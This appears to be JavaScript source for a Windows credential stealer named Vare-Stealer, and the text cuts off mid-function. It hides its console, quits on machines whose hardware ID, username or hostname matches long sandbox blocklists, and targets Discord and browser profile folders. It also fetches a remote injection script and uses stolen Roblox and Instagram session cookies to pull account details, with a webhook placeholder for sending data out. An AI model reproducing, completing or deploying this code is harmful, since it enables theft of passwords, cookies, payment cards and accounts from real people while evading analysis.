const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const sqlite3 = require('sqlite3');
const vare = require("vareapi");
const axios = require('axios');
const os = require('os');
const fse = require('fs-extra')
const FormData = require('form-data');
const JSZip = require('jszip');
const screenshot = require('screenshot-desktop');
const { execSync, exec } = require('child_process');
const hideconsole = require('node-hide-console-window');
const buf_replace = require('buffer-replace');

let killdcop = true; // if u want to close discord make this "true" if u dont want to close discord make this "false";


const %webhookstring% = "REPLACE_YOUR_WEBHOOK"
const %INJURLL% = "https://raw.githubusercontent.com/saintdaddy/Vare-Stealer/main/injection/index.js"
const %keywordstring% = ['github.com','gmail.com','twitch.tv','instagram.com']


const hwid = execSync('WMIC csproduct get UUID').toString().trim().split('\n')[1];
var hwidblack = ["00000000-0000-0000-0000-000000000000", "00000000-0000-0000-0000-50E5493391EF", "00000000-0000-0000-0000-AC1F6BD047A0", "00000000-0000-0000-0000-AC1F6BD04850", "00000000-0000-0000-0000-AC1F6BD048D6", "00000000-0000-0000-0000-AC1F6BD048DC", "00000000-0000-0000-0000-AC1F6BD048F8", "00000000-0000-0000-0000-AC1F6BD048FE", "00000000-0000-0000-0000-AC1F6BD04900", "00000000-0000-0000-0000-AC1F6BD0491C", "00000000-0000-0000-0000-AC1F6BD04926", "00000000-0000-0000-0000-AC1F6BD04928", "00000000-0000-0000-0000-AC1F6BD04972", "00000000-0000-0000-0000-AC1F6BD04976", "00000000-0000-0000-0000-AC1F6BD04978", "00000000-0000-0000-0000-AC1F6BD04986", "00000000-0000-0000-0000-AC1F6BD049B8", "00000000-0000-0000-0000-AC1F6BD04C0A", "00000000-0000-0000-0000-AC1F6BD04D06", "00000000-0000-0000-0000-AC1F6BD04D08", "00000000-0000-0000-0000-AC1F6BD04D8E", "00000000-0000-0000-0000-AC1F6BD04D98", "00000000-0000-0000-0000-AC1F6BD04DC0", "00000000-0000-0000-0000-AC1F6BD04DCC", "02AD9898-FA37-11EB-AC55-1D0C0A67EA8A", "032E02B4-0499-05C3-0806-3C0700080009", "03AA02FC-0414-0507-BC06-D70700080009", "03D40274-0435-05BF-D906-D20700080009", "03DE0294-0480-05DE-1A06-350700080009", "050C3342-FADD-AEDF-EF24-C6454E1A73C9", "05790C00-3B21-11EA-8000-3CECEF4400D0", "0700BEF3-1410-4284-81B1-E5C17FA9E18F", "07AF2042-392C-229F-8491-455123CC85FB", "07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9", "08C1E400-3C56-11EA-8000-3CECEF43FEDE", "0910CBA3-B396-476B-A7D7-716DB90F5FB9", "0934E336-72E4-4E6A-B3E5-383BD8E938C3", "0A36B1E3-1F6B-47DE-8D72-D4F46927F13F", "0A9D60D4-9A32-4317-B7C0-B11B5C677335", "0D748400-3B00-11EA-8000-3CECEF44007E", "0F377508-5106-45F4-A0D6-E8352F51A8A5", "104F9B96-5B46-4567-BF56-0066C1C6F7F0", "11111111-2222-3333-4444-555555555555", "119602E8-92F9-BD4B-8979-DA682276D385", "12204D56-28C0-AB03-51B7-44A8B7525250", "12EE3342-87A2-32DE-A390-4C2DA4D512E9", "138D921D-680F-4145-BDFF-EC463E70C77D", "13A61742-AF45-EFE4-70F4-05EF50767784", "14692042-A78B-9563-D59D-EB7DD2639037", "1AAD2042-66E8-C06A-2F81-A6A4A6A99093", "1B5D3FFD-A28E-4F11-9CD6-FF148989548C", "1D4D3342-D6C4-710C-98A3-9CC6571234D5", "213D2878-0E33-4D8C-B0D1-31425B9DE674", "222EFE91-EAE3-49F1-8E8D-EBAE067F801A", "26645000-3B67-11EA-8000-3CECEF440124", "2AB86800-3C50-11EA-8000-3CECEF440130", "2C5C2E42-E7B1-4D75-3EA3-A325353CDB72", "2CEA2042-9B9B-FAC1-44D8-159FE611FCCC", "2DD1B176-C043-49A4-830F-C623FFB88F3C", "2E6FB594-9D55-4424-8E74-CE25A25E36B0", "2F94221A-9D07-40D9-8C98-87CB5BFC3549", "2FBC3342-6152-674F-08E4-227A81CBD5F5", "34419E14-4019-11EB-9A22-6C4AB634B69A", "361E3342-9FAD-AC1C-F1AD-02E97892270F", "365B4000-3B25-11EA-8000-3CECEF44010C", "38813342-D7D0-DFC8-C56F-7FC9DFE5C972", "38AB3342-66B0-7175-0B23-F390B3728B78", "3A9F3342-D1F2-DF37-68AE-C10F60BFB462", "3EDC0561-C455-4D64-B176-3CFBBBF3FA47", "3F284CA4-8BDF-489B-A273-41B44D668F6D", "3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E", "3FADD8D6-3754-47C4-9BFF-0E35553DD5FB", "40384E87-1FBA-4096-9EA1-D110F0EA92A8", "40F100F9-401C-487D-8D37-48107C6CE1D3", "418F0D5B-FCB6-41F5-BDA5-94C1AFB240ED", "41B73342-8EA1-E6BF-ECB0-4BC8768D86E9", "42A82042-3F13-512F-5E3D-6BF4FFFD8518", "44B94D56-65AB-DC02-86A0-98143A7423BF", "4729AEB0-FC07-11E3-9673-CE39E79C8A00", "481E2042-A1AF-D390-CE06-A8F783B1E76A", "48941AE9-D52F-11DF-BBDA-503734826431", "49434D53-0200-9036-2500-369025000C65", "49434D53-0200-9036-2500-369025003865", "49434D53-0200-9036-2500-369025003A65", "49434D53-0200-9036-2500-369025003AF0", "49434D53-0200-9036-2500-369025005CF0", "49434D53-0200-9036-2500-36902500F022", "49434D53-0200-9065-2500-659025002274", "49434D53-0200-9065-2500-659025005073", "49434D53-0200-9065-2500-659025008074", "49434D53-0200-9065-2500-65902500E439", "499B0800-3C18-11EA-8000-3CECEF43FEA4", "4C4C4544-0050-3710-8058-CAC04F59344A", "4CB82042-BA8F-1748-C941-363C391CA7F3", "4CE94980-D7DA-11DD-A621-08606E889D9B", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "4DC32042-E601-F329-21C1-03F27564FD6C", "4EDF3342-E7A2-5776-4AE5-57531F471D56", "51646514-93E1-4CB6-AF29-036B45D14CBF", "52A1C000-3BAB-11EA-8000-3CECEF440204", "56B9F600-3C1C-11EA-8000-3CECEF4401DE", "59C68035-4B21-43E8-A6A6-BD734C0EE699", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "5C1CA40D-EF14-4DF8-9597-6C0B6355D0D6", "5CC7016D-76AB-492D-B178-44C12B1B3C73", "5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E", "5E573342-6093-4F2D-5F78-F51B9822B388", "5EBC5C00-3B70-11EA-8000-3CECEF4401DA", "5EBD2E42-1DB8-78A6-0EC3-031B661D5C57", "60C83342-0A97-928D-7316-5F1080A78E72", "612F079A-D69B-47EA-B7FF-13839CD17404", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "63DE70B4-1905-48F2-8CC4-F7C13B578B34", "63FA3342-31C7-4E8E-8089-DAFF6CE5E967", "64176F5E-8F74-412F-B3CF-917EFA5FB9DB", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "66729280-2B0C-4BD0-8131-950D86871E54", "66CC1742-AAC7-E368-C8AE-9EEB22BD9F3B", "671BC5F7-4B0F-FF43-B923-8B1645581DC8", "67442042-0F69-367D-1B2E-1EE846020090", "67C5A563-3218-4718-8251-F38E3F6A89C1", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "686D4936-87C1-4EBD-BEB7-B3D92ECA4E28", "6881083C-EE5A-43E7-B7E3-A0CE9227839C", "69AEA650-3AE3-455C-9F80-51159BAE5EAE", "6A669639-4BD2-47E5-BE03-9CBAFC9EF9B3", "6AA13342-49AB-DC46-4F28-D7BDDCE6BE32", "6ECEAF72-3548-476C-BD8D-73134A9182C8", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "71522042-DA0B-6793-668B-CE95AEA7FE21", "72492D47-52EF-427A-B623-D4F2192F97D4", "73163342-B704-86D5-519B-18E1D191335C", "777D84B3-88D1-451C-93E4-D235177420A7", "782ED390-AE10-4727-A866-07018A8DED22", "79AF5279-16CF-4094-9758-F88A616D81B4", "7A484800-3B19-11EA-8000-3CECEF440122", "7AB5C494-39F5-4941-9163-47F54D6D5016", "7CA33342-A88C-7CD1-1ABB-7C0A82F488BF", "7D341C16-E8E9-42EA-8779-93653D877231", "7D6A0A6D-394E-4179-9636-662A8D2C7304", "7E4755A6-7160-4982-8F5D-6AA481749F10", "80152042-2F34-11D1-441F-5FADCA01996D", "83BFD600-3C27-11EA-8000-3CECEF4400B4", "844703CF-AA4E-49F3-9D5C-74B8D1F5DCB6", "84782042-E646-50A0-159F-A8E75D4F9402", "84FE3342-6C67-5FC6-5639-9B3CA3D775A1", "84FEEFBC-805F-4C0E-AD5B-A0042999134D", "8703841B-3C5E-461C-BE72-1747D651CE89", "88DC3342-12E6-7D62-B0AE-C80E578E7B07", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "8DA62042-8B59-B4E3-D232-38B29A10964A", "8EC60B88-7F2B-42DA-B8C3-4E2EF2A8C603", "907A2A79-7116-4CB6-9FA5-E5A58C4587CD", "90A83342-D7E7-7A14-FFB3-2AA345FDBC89", "91625303-5211-4AAC-9842-01A41BA60D5A", "91A9EEDB-4652-4453-AC5B-8E92E68CBCF5", "921E2042-70D3-F9F1-8CBD-B398A21F89C6", "94515D88-D62B-498A-BA7C-3614B5D4307C", "95BF6A00-3C63-11EA-8000-3CECEF43FEB8", "96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE", "9921DE3A-5C1A-DF11-9078-563412000026", "9B2F7E00-6F4C-11EA-8000-3CECEF467028", "9C6D1742-046D-BC94-ED09-C36F70CC9A91", "9FC997CA-5081-4751-BC78-CE56D06F6A62", "A100EFD7-4A31-458F-B7FE-2EF95162B32F", "A15A930C-8251-9645-AF63-E45AD728C20C", "A19323DA-80B2-48C9-9F8F-B21D08C3FE07", "A1A849F7-0D57-4AD3-9073-C79D274EECC8", "A2339E80-BB69-4BF5-84BC-E9BE9D574A65", "A5CE2042-8D25-24C4-71F7-F56309D7D45F", "A6A21742-8023-CED9-EA8D-8F0BC4B35DEA", "A7721742-BE24-8A1C-B859-D7F8251A83D3", "A9C83342-4800-0578-1EE8-BA26D2A678D2", "AAFC2042-4721-4E22-F795-A60296CAC029", "ACA69200-3C4C-11EA-8000-3CECEF4401AA", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "AF1B2042-4B90-0000-A4E4-632A1C8C7EB1", "B1112042-52E8-E25B-3655-6A4F54155DBF", "B22B623B-6B62-4F9B-A9D3-94A15453CEF4", "B5B77895-D40B-4F30-A565-6EF72586A14A", "B6464A2B-92C7-4B95-A2D0-E5410081B812", "B9DA2042-0D7B-F938-8E8A-DA098462AAEC", "BB233342-2E01-718F-D4A1-E7F69D026428", "BB64E044-87BA-C847-BC0A-C797D1A16A50", "BE784D56-81F5-2C8D-9D4B-5AB56F05D86E", "BFE62042-E4E1-0B20-6076-C5D83EDFAFCE", "C0342042-AF96-18EE-C570-A5EFA8FF8890", "C249957A-AA08-4B21-933F-9271BEC63C85", "C364B4FE-F1C1-4F2D-8424-CB9BD735EF6E", "C51E9A00-3BC3-11EA-8000-3CECEF440034", "C6B32042-4EC3-6FDF-C725-6F63914DA7C7", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "C9283342-8499-721F-12BE-32A556C9A7A8", "CC4AB400-3C66-11EA-8000-3CECEF43FE56", "CC5B3F62-2A04-4D2E-A46C-AA41B7050712", "CD74107E-444E-11EB-BA3A-E3FDD4B29537", "CE352E42-9339-8484-293A-BD50CDC639A5", "CEFC836C-8CB1-45A6-ADD7-209085EE2A57", "CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F", "D2DC3342-396C-6737-A8F6-0C6673C1DE08", "D4260370-C9F1-4195-95A8-585611AE73F2", "D4C44C15-4BAE-469B-B8FD-86E5C7EB89AB", "D5DD3342-46B5-298A-2E81-5CA6867168BE", "D7382042-00A0-A6F0-1E51-FD1BBF06CD71", "D7958D98-A51E-4B34-8C51-547A6C2E6615", "D8C30328-1B06-4611-8E3C-E433F4F9794E", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D", "DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F", "DD45F600-3C63-11EA-8000-3CECEF440156", "DD9C3342-FB80-9A31-EB04-5794E5AE2B4C", "DEAEB8CE-A573-9F48-BD40-62ED6C223F20", "E08DE9AA-C704-4261-B32D-57B2A3993518", "E0C806ED-B25A-4744-AD7D-59771187122E", "E1BA2E42-EFB1-CDFD-7A84-8A39F747E0C5", "E2342042-A1F8-3DCF-0182-0E63D607BCC7", "E3BB3342-02A8-5613-9C92-3747616194FD", "E57F6333-A2AC-4F65-B442-20E928C0A625", "E67640B3-2B34-4D7F-BD62-59A1822DDBDC", "E6DBCCDF-5082-4479-B61A-6990D92ACC5F", "E773CC89-EFB8-4DB6-A46E-6CCA20FE4E1A", "EADD1742-4807-00A0-F92E-CCD933E9D8C1", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "F3EA4E00-3C5F-11EA-8000-3CECEF440016", "F5744000-3C78-11EA-8000-3CECEF43FEFE", "F5BB1742-D36D-A11E-6580-2EA2427B0038", "F5EFEEAC-96A0-11EB-8365-FAFE299935A9", "F68B2042-E3A7-2ADA-ADBC-A6274307A317", "F705420F-0BB3-4688-B75C-6CD1352CABA9", "F91C9458-6656-4E83-B84A-13641DE92949", "F9E41000-3B35-11EA-8000-3CECEF440150", "FA612E42-DC79-4F91-CA17-1538AD635C95", "FA8C2042-205D-13B0-FCB5-C5CC55577A35", "FBC62042-5DE9-16AD-3F27-F818E5F68DD3", "FC40ACF8-DD97-4590-B605-83B595B0C4BA", "FCE23342-91F1-EAFC-BA97-5AAE4509E173", "FE455D1A-BE27-4BA4-96C8-967A6D3A9661", "FED63342-E0D6-C669-D53F-253D696D74DA", "FF577B79-782E-0A4D-8568-B35A9B7EB76B", "9CFF2042-2043-0340-4F9C-4BAE6DC5BB39", "D7AC2042-05F8-0037-54A6-38387D00B767", "52562042-B33F-C9D3-0149-241F40A0F5D8", "3E9AC505-812A-456F-A9E6-C7426582500E", "11E12042-2404-040A-31E4-27374099F748", "6E963342-B9C8-2D14-B057-C60C35722AD4", "9EB0FAF6-0713-4576-BD64-813DEE9E477E", "0B8A2042-2E8E-BECC-B6A4-7925F2163DC9", "89E32042-1B2B-5C76-E966-D4E363846FD4", "699400A5-AFC6-427A-A56F-CE63D3E121CB", "2F230ED7-5797-4DB2-BAA0-99A193503E4B"]
var pcuserblack = ["05h00Gi0", "3u2v9m8", "43By4", "4tgiizsLimS", "6O4KyHhJXBiR", "7wjlGX7PjlW4", "8Nl0ColNQ5bq", "8VizSM", "Abby", "Amy", "AppOnFlySupport", "ASPNET", "azure", "BUiA1hkm", "BvJChRPnsxn", "cM0uEGN4do", "cMkNdS6", "DefaultAccount", "dOuyo8RV71", "DVrzi", "e60UW", "ecVtZ5wE", "EGG0p", "Frank", "fred", "G2DbYLDgzz8Y", "george", "GjBsjb", "Guest", "h7dk1xPr", "h86LHD", "Harry Johnson", "HEUeRzl", "hmarc", "ICQja5iT", "IVwoKUF", "j6SHA37KA", "j7pNjWM", "John", "jude", "Julia", "kEecfMwgj", "kFu0lQwgX5P", "KUv3bT4", "Lisa", "lK3zMR", "lmVwjj9b", "Louise", "Lucas", "mike", "Mr.None", "noK4zG7ZhOf", "o6jdigq", "o8yTi52T", "OgJb6GqgK0O", "patex", "PateX", "Paul Jones", "pf5vj", "PgfV1X", "PqONjHVwexsS", "pWOuqdTDQ", "PxmdUOpVyx", "QfofoG", "QmIS5df7u", "QORxJKNk", "qZo9A", "RDhJ0CNFevzX", "RGzcBUyrznReg", "S7Wjuf", "server", "SqgFOf3G", "Steve", "test", "TVM", "txWas1m2t", "umyUJ", "Uox1tzaMO", "User01", "w0fjuOVmCcP5A", "WDAGUtilityAccount", "XMiMmcKziitD", "xPLyvzr8sgC", "ykj0egq7fze", "DdQrgc", "ryjIJKIrOMs", "nZAp7UBVaS1", "zOEsT", "l3cnbB8Ar5b8", "xUnUy", "fNBDSlDTXY", "vzY4jmH0Jw02", "gu17B", "UiQcX", "21zLucUnfI85", "OZFUCOD6", "8LnfAai9QdJR", "5sIBK", "rB5BnfuR2", "GexwjQdjXG", "IZZuXj", "ymONofg", "dxd8DJ7c", "JAW4Dz0", "GJAm1NxXVm", "UspG1y1C", "equZE3J", "BXw7q", "lubi53aN14cU", "5Y3y73", "9yjCPsEYIMH", "GGw8NR", "JcOtj17dZx", "05KvAUQKPQ", "64F2tKIqO5", "7DBgdxu", "uHUQIuwoEFU", "gL50ksOp", "Of20XqH4VL", "tHiF2T", "sal.rosenburg"];
var hostnameblack = ["373836","00900BC83803", "0CC47AC83803", "6C4E733F-C2D9-4", "ACEPC", "AIDANPC", "ALENMOOS-PC", "ALIONE", "APPONFLY-VPS", "ARCHIBALDPC", "azure", "B30F0242-1C6A-4", "BAROSINO-PC", "BECKER-PC", "BEE7370C-8C0C-4", "COFFEE-SHOP", "COMPNAME_4047", "d1bnJkfVlH", "DESKTOP-19OLLTD", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "DESKTOP-4U8DTF8", "DESKTOP-54XGX6F", "DESKTOP-5OV9S0O", "DESKTOP-6AKQQAM", "DESKTOP-6BMFT65", "DESKTOP-70T5SDX", "DESKTOP-7AFSTDP", "DESKTOP-7XC6GEZ", "DESKTOP-8K9D93B", "DESKTOP-AHGXKTV", "DESKTOP-ALBERTO", "DESKTOP-B0T93D6", "DESKTOP-BGN5L8Y", "DESKTOP-BUGIO", "DESKTOP-BXJYAEC", "DESKTOP-CBGPFEE", "DESKTOP-CDQE7VN", "DESKTOP-CHAYANN", "DESKTOP-CM0DAW8", "DESKTOP-CNFVLMW", "DESKTOP-CRCCCOT", "DESKTOP-D019GDM", "DESKTOP-D4FEN3M", "DESKTOP-DE369SE", "DESKTOP-DIL6IYA", "DESKTOP-ECWZXY2", "DESKTOP-F7BGEN9", "DESKTOP-FSHHZLJ", "DESKTOP-G4CWFLF", "DESKTOP-GELATOR", "DESKTOP-GLBAZXT", "DESKTOP-GNQZM0O", "DESKTOP-GPPK5VQ", "DESKTOP-HASANLO", "DESKTOP-HQLUWFA", "DESKTOP-HSS0DJ9", "DESKTOP-IAPKN1P", "DESKTOP-IFCAQVL", "DESKTOP-ION5ZSB", "DESKTOP-JQPIFWD", "DESKTOP-KALVINO", "DESKTOP-KOKOVSK", "DESKTOP-NAKFFMT", "DESKTOP-NKP0I4P", "DESKTOP-NM1ZPLG", "DESKTOP-NTU7VUO", "DESKTOP-QUAY8GS", "DESKTOP-RCA3QWX", "DESKTOP-RHXDKWW", "DESKTOP-S1LFPHO", "DESKTOP-SUPERIO", "DESKTOP-V1L26J5", "DESKTOP-VIRENDO", "DESKTOP-VKNFFB6", "DESKTOP-VRSQLAG", "DESKTOP-VWJU7MF", "DESKTOP-VZ5ZSYI", "DESKTOP-W8JLV9V", "DESKTOP-WG3MYJS", "DESKTOP-WI8CLET", "DESKTOP-XOY7MHS", "DESKTOP-Y8ASUIL", "DESKTOP-YW9UO1H", "DESKTOP-ZJF9KAN", "DESKTOP-ZMYEHDA", "DESKTOP-ZNCAEAM", "DESKTOP-ZOJJ8KL", "DESKTOP-ZV9GVYL", "DOMIC-DESKTOP", "EA8C2E2A-D017-4", "ESPNHOOL", "GANGISTAN", "GBQHURCC", "GRAFPC", "GRXNNIIE", "gYyZc9HZCYhRLNg", "JBYQTQBO", "JERRY-TRUJILLO", "JOHN-PC", "JUDES-DOJO", "JULIA-PC", "LANTECH-LLC", "LISA-PC", "LOUISE-PC", "LUCAS-PC", "MIKE-PC", "NETTYPC", "ORELEEPC", "ORXGKKZC", "Paul Jones", "PC-DANIELE", "PROPERTY-LTD", "Q9IATRKPRH", "QarZhrdBpj", "RALPHS-PC", "SERVER-PC", "SERVER1", "Steve", "SYKGUIDE-WS17", "T00917", "test42", "TIQIYLA9TW5M", "TMKNGOMU", "TVM-PC", "VONRAHEL", "WILEYPC", "WIN-5E07COS9ALR", "WINDOWS-EEL53SN", "WINZDS-1BHRVPQU", "WINZDS-22URJIBV", "WINZDS-3FF2I9SN", "WINZDS-5J75DTHH", "WINZDS-6TUIHN7R", "WINZDS-8MAEI8E4", "WINZDS-9IO75SVG", "WINZDS-AM76HPK2", "WINZDS-B03L9CEO", "WINZDS-BMSMD8ME", "WINZDS-BUAOKGG1", "WINZDS-K7VIK4FC", "WINZDS-QNGKGN59", "WINZDS-RST0E8VU", "WINZDS-U95191IG", "WINZDS-VQH86L5D", "WORK", "XC64ZB", "XGNSVODU", "ZELJAVA", "3CECEFC83806", "C81F66C83805", "DESKTOP-USLVD7G", "DESKTOP-AUPFKSY", "DESKTOP-RP4FIBL", "DESKTOP-6UJBD2J", "DESKTOP-LTMCKLA", "DESKTOP-FLTWYYU", "DESKTOP-WA2BY3L", "DESKTOP-UBDJJ0A", "DESKTOP-KXP5YFO", "DESKTOP-DAU8GJ2", "DESKTOP-FCRB3FM", "DESKTOP-VYRNO7M", "DESKTOP-PKQNDSR", "DESKTOP-SCNDJWE", "DESKTOP-RSNLFZS", "DESKTOP-MWFRVKH", "DESKTOP-QLN2VUF", "DESKTOP-62YPFIQ", "DESKTOP-PA0FNV5", "DESKTOP-B9OARKC", "DESKTOP-J5XGGXR", "DESKTOP-JHUHOTB", "DESKTOP-64ACUCH", "DESKTOP-SUNDMI5", "DESKTOP-GCN6MIO", "FERREIRA-W10", "DESKTOP-MJC6500", "DESKTOP-WS7PPR2", "DESKTOP-XWQ5FUV", "DESKTOP-UHHSY4R", "DESKTOP-ZJRWGX5", "DESKTOP-ZYQYSRD", "WINZDS-MILOBM35", "DESKTOP-K8Y2SAM", "DESKTOP-4GCZVJU", "DESKTOP-O6FBMF7", "DESKTOP-WDT1SL6", "EIEEIFYE", "CRYPTODEV222222", "EFA0FDEC-8FA7-4"];

if (pcuserblack.includes(os.userInfo().username)) {
  process.exit(1);
}
if (hostnameblack.includes(os.hostname())) {
  process.exit(1);
}
if (hwidblack.includes(hwid)) {
  process.exit(1);
}



let appdata = process.env.APPDATA;
let localappdata = process.env.LOCALAPPDATA;
let LOCAL = process.env.LOCALAPPDATA
let discords = [];
let injectPath = [];

let passwordCount = 0;
let cookieCount = 0;
let ccCount = 0;
let autofillCount = 0;


const all_founds = [];
const tokens = [];

paths = [
  appdata + '\\discord\\',
  appdata + '\\discordcanary\\',
  appdata + '\\discordptb\\',
  appdata + '\\discorddevelopment\\',
  appdata + '\\lightcord\\',
  localappdata + '\\Google\\Chrome\\User Data\\Default\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\',
  localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\',
  localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
  localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
  appdata + '\\Opera Software\\Opera Stable\\',
  appdata + '\\Opera Software\\Opera GX Stable\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
];

async function %GETNETWORK%() {
    var ip = await axios.get("http://ip-api.com/json/")
    let data = {}
    data['ip'] = ip.data.query; data['country'] = ip.data.countryCode;
    return data
}

async function %GETEMBED%() {
  let embdata = {};
  let embed = JSON.parse(JSON.stringify((await axios.get("https://raw.githubusercontent.com/saintdaddy/vare-stealer/main/vare.json")).data));
  embdata["avatar"] = embed.avatarurl;
  embdata["url"] = embed.discord;
  embdata["footericon"] = embed.footerurl;
  return embdata;
}


async function %GETIP%() {
    var data = await %GETNETWORK%()
    return data.ip
}

async function %GETCOUNTRY%() {
    var data = await %GETNETWORK%()
    return data.country
}

async function %GETROBLOX%(secret_cookie) {
    let data = {};
    let headers = { 
        'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
        'cookie': `.ROBLOSECURITY=${secret_cookie.toString()};`,
        'origin': 'https://www.roblox.com',
        'referer': 'https://www.roblox.com',
        'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
    }
    let response = await axios.get('https://www.roblox.com/mobileapi/userinfo', { headers: headers });
    data['id'] = response.data['UserID'];
    data['username'] = response.data['UserName'];
    data['avatar'] = response.data['ThumbnailUrl'];
    data['robux'] = response.data['RobuxBalance'];
    data['premium'] = response.data['IsPremium'];
    return data
}


function generateRandomString(length) {
  let result = '';
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

const random = generateRandomString(5);

async function %INSTADATA%(cookie) {
  let data = {}
  let headers = { 
  "Host": "i.instagram.com",
  "X-Ig-Connection-Type": "WiFi",
  "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", 
  "X-Ig-Capabilities": "36r/Fx8=", 
  "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+", 
  "X-Ig-App-Locale": "en", 
  "X-Mid": "Ypg64wAAAAGXLOPZjFPNikpr8nJt", 
  "Accept-Encoding": "gzip, deflate",  
  "Cookie": `sessionid=${cookie};`
};
  let response = await axios.get(`https://i.instagram.com/api/v1/accounts/current_user/?edit=true`, { headers: headers }).catch(error => { return false; })
